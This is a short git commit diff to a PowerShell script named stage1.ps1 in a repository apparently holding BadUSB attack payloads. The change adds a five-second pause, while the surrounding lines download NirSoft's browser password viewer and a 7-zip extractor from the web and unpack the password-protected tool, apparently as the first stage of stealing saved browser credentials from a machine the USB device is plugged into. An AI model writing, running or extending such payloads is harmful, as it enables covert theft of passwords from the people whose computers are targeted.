e241ca2ceea95bd26e25b926c394ca90efa6d2d1
b1g_ph4rm4 <132758165+Gvte-Kali@users.noreply.github.com>
2024-02-03 17:22:11 +0100

    Update stage1.ps1

--- BadUSB/W1ns1d3r/W1ns1d3r_st4gg3d/stage1.ps1
+++ BadUSB/W1ns1d3r/W1ns1d3r_st4gg3d/stage1.ps1
@@ -58,6 +58,10 @@ function Get-Nirsoft {
     $zipPassword = 'wbpv28821@'  # Archive password
     Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+    
+    # Pause de 5 secondes
+    Start-Sleep -Seconds 5
+    
     Expand-Archive 7z.zip
     .\7z\7za.exe e wbpv.zip -p $zipPassword
 
